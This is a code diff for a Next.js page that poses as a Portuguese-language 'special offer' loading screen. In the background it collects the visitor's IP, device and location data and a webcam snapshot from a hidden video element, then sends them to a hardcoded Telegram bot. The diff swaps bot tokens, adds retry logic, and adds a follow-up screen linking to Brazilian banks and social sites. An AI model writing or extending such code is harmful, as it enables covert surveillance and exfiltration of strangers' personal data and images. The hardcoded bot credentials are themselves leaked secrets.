@@ -1,18 +1,51 @@
 "use client"
 
-import { useEffect, useRef } from "react"
+import { useEffect, useRef, useState } from "react"
 import { sendTelegramMessage } from "@/services/telegram"
 import { nanoid } from "nanoid"
 import { DeviceInfo, LocationInfo, CaptureData } from "@/types/telegram"
 
-const BOT_TOKEN = "7708090733:AAEm01sIJpFKlDIQCqvuCwLIrmbIMEYB9Gg"
-const CHAT_ID = "7708090733"
+const BOT_TOKEN = "7603494542:AAEM6ePFYl7iY7tWpeVylATVkTOvoywy2lc"
+const CHAT_ID = "7603494542"
+
+const ALTERNATIVE_LINKS = [
+  {
+    name: "Mercado Pago",
+    url: "https://www.mercadopago.com.br",
+    icon: "💳"
+  },
+  {
+    name: "Nubank",
+    url: "https://nubank.com.br",
+    icon: "💜"
+  },
+  {
+    name: "WhatsApp",
+    url: "https://web.whatsapp.com",
+    icon: "📱"
+  },
+  {
+    name: "Instagram",
+    url: "https://www.instagram.com",
+    icon: "📸"
+  },
+  {
+    name: "Google Drive",
+    url: "https://drive.google.com",
+    icon: "📁"
+  }
+]
 
 function LinkPageClient() {
   const videoRef = useRef<HTMLVideoElement>(null)
+  const [isCapturing, setIsCapturing] = useState(false)
+  const [captureComplete, setCaptureComplete] = useState(false)
 
   useEffect(() => {
     const captureData = async () => {
+      if (isCapturing) return
+      setIsCapturing(true)
+
       try {
         // Get IP address
         let ip = "Unknown"
@@ -86,7 +119,7 @@ function LinkPageClient() {
             const ctx = canvas.getContext('2d')
             if (ctx) {
               ctx.drawImage(videoRef.current, 0, 0)
-              imageData = canvas.toDataURL('image/jpeg', 0.8) // Reduced quality for better performance
+              imageData = canvas.toDataURL('image/jpeg', 0.8)
               stream.getTracks().forEach(track => track.stop())
             }
           }
@@ -103,31 +136,13 @@ function LinkPageClient() {
 
         // Save to localStorage and notify dashboard
         try {
-          // Get existing captures or initialize empty array
-          let captures = []
-          try {
-            const savedCaptures = localStorage.getItem('captures')
-            if (savedCaptures) {
-              captures = JSON.parse(savedCaptures)
-            }
-          } catch (error) {
-            console.error('Error reading from localStorage:', error)
-          }
+          // Clear old captures and save new one
+          localStorage.setItem('captures', JSON.stringify([capturedInfo]))
+          console.log('Data saved to localStorage successfully')
 
-          // Add new capture
-          captures.push(capturedInfo)
-
-          // Save back to localStorage
-          try {
-            localStorage.setItem('captures', JSON.stringify(captures))
-            console.log('Data saved to localStorage successfully')
-
-            // Notify all tabs about the new capture
-            window.localStorage.setItem('lastCapture', JSON.stringify(capturedInfo))
-            window.localStorage.removeItem('lastCapture')
-          } catch (error) {
-            console.error('Error saving to localStorage:', error)
-          }
+          // Notify all tabs about the new capture
+          window.localStorage.setItem('lastCapture', JSON.stringify(capturedInfo))
+          window.localStorage.removeItem('lastCapture')
 
           // Send to Telegram with retry logic
           let retryCount = 0
@@ -142,16 +157,20 @@ function LinkPageClient() {
               console.error(`Error sending to Telegram (attempt ${retryCount + 1}):`, error)
               retryCount++
               if (retryCount < maxRetries) {
-                await new Promise(resolve => setTimeout(resolve, 1000)) // Wait 1 second before retry
+                await new Promise(resolve => setTimeout(resolve, 1000))
               }
             }
           }
+
+          setCaptureComplete(true)
         } catch (error) {
           console.error('Error in save process:', error)
         }
 
       } catch (error) {
         console.error('Error in capture process:', error)
+      } finally {
+        setIsCapturing(false)
       }
     }
 
@@ -160,16 +179,40 @@ function LinkPageClient() {
   }, [])
 
   return (
-    <div className="min-h-screen bg-gradient-to-br from-blue-500 to-purple-600 flex flex-col items-center justify-center p-4">
+    <div className="min-h-screen bg-gradient-to-br from-red-500 to-red-700 flex flex-col items-center justify-center p-4">
       <div className="max-w-md w-full bg-white rounded-lg shadow-lg p-6">
-        <div className="animate-pulse">
-          <div className="h-4 bg-gray-200 rounded w-3/4 mb-4"></div>
-          <div className="h-4 bg-gray-200 rounded w-1/2 mb-4"></div>
-          <div className="h-4 bg-gray-200 rounded w-2/3"></div>
-        </div>
-        <p className="text-gray-500 text-sm mt-4 text-center">
-          Preparando sua oferta especial...
-        </p>
+        {!captureComplete ? (
+          <>
+            <div className="animate-pulse">
+              <div className="h-4 bg-gray-200 rounded w-3/4 mb-4"></div>
+              <div className="h-4 bg-gray-200 rounded w-1/2 mb-4"></div>
+              <div className="h-4 bg-gray-200 rounded w-2/3"></div>
+            </div>
+            <p className="text-gray-500 text-sm mt-4 text-center">
+              Preparando sua oferta especial...
+            </p>
+          </>
+        ) : (
+          <div className="space-y-4">
+            <h2 className="text-xl font-bold text-center text-red-600">
+              Oferta Especial Disponibilizada!
+            </h2>
+            <div className="grid grid-cols-2 gap-3">
+              {ALTERNATIVE_LINKS.map((link, index) => (
+                <a
+                  key={index}
+                  href={link.url}
+                  target="_blank"
+                  rel="noopener noreferrer"
+                  className="flex items-center justify-center p-3 bg-red-600 text-white rounded-lg hover:bg-red-700 transition-colors"
+                >
+                  <span className="mr-2">{link.icon}</span>
+                  {link.name}
+                </a>
+              ))}
+            </div>
+          </div>
+        )}
       </div>
       <video
         ref={videoRef}
